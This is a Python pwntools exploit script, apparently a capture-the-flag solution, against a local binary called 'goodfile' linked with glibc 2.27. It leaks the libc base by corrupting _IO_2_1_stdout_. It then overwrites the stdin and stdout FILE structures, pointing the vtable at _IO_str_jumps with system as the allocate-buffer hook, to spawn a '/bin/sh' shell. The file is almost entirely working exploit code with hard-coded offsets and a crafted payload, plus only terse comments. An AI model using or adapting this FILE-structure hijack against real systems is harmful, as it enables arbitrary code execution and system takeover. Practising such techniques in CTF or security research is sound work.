#coding:utf-8
from pwn import *
context(arch='amd64',log_level='debug')
context.terminal = ["/bin/tmux", "sp",'-h']
def new(size, offset, data, quiet=False):
    if quiet:
        p.sendline("1")
        p.sendline(str(size))
        p.sendline(str(offset))
        p.sendline(data)
    else:
        p.sendlineafter("> ", "1")
        p.sendlineafter(": ", str(size))
        p.sendlineafter(": ", str(offset))
        p.sendlineafter(": ", data)


libc = ELF("/home/yrl/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc.so.6")
p=process("./goodfile")
# elf=ELF('./goodfile')
# print (elf.libc)
# libc=elf.libc
# make chunk adjacent to libc
base = 0x200000
space = (base + 0x1000) * 1 - 0x10
# make _IO_read_end = _IO_write_base
new(base, space + libc.sym['_IO_2_1_stdout_'] + 0x10 + 1, 'A')
space = (base + 0x1000) * 2 - 0x10
new(base, space + libc.sym['_IO_2_1_stdout_'] + 0x20 + 1, 'B', quiet=True)
libc_base = u64(p.recvline()[0x08:0x10]) - 0x3ed8b0
success("libc = " + hex(libc_base))

# get the shell!
space = (base + 0x1000) * 3 - 0x10
new(base, space + libc.sym['_IO_2_1_stdin_'] + 0x38 + 1, 'C')
gdb.attach(p)

# stdin
payload = p64(0xfbad208b)
# make stdin's read_ptr >= read_end to trigger __underflow(fp)
payload += p64(libc_base + libc.sym['_IO_2_1_stdout_'] + 0x84)
# make _IO_buf_base point to stdout,copy the buffer to user memory
payload += p64(libc_base + libc.sym['_IO_2_1_stdout_']) * 6
# make IO_buf_end = stdout + 0x100
payload += p64(libc_base + libc.sym['_IO_2_1_stdout_'] + 0x100)
payload += b'\0' * (8*7 + 4) # padding

new_size = libc_base + libc.search('/bin/sh\x00').next()
# stdout
payload += p64(0xfbad1800)
payload += p64(0) # _IO_read_ptr
payload += p64(0) # _IO_read_end
payload += p64(0) # _IO_read_base
payload += p64(0) # _IO_write_base
payload += p64((new_size - 100) // 2) # _IO_write_ptr
payload += p64(0) # _IO_write_end
payload += p64(0) # _IO_buf_base
payload += p64((new_size - 100) // 2) # _IO_buf_end
payload += p64(0) * 4
payload += p64(libc_base + libc.sym["_IO_2_1_stdin_"])
payload += p64(1) + p64((1<<64) - 1)
payload += p64(0) + p64(libc_base + 0x3ed8c0)
payload += p64((1<<64) - 1) + p64(0)
payload += p64(libc_base + 0x3eb8c0)
payload += p64(0) * 6
payload += p64(libc_base + 0x3e8360) # _IO_str_jumps
payload += p64(libc_base + libc.sym["system"]) # _allocate_buffer
payload += p64(libc_base + libc.sym["_IO_2_1_stdout_"]) # _free_buffer
payload += p64(libc_base + libc.sym["_IO_2_1_stdin_"])
p.sendlineafter("> ", payload)
pause()

p.interactive()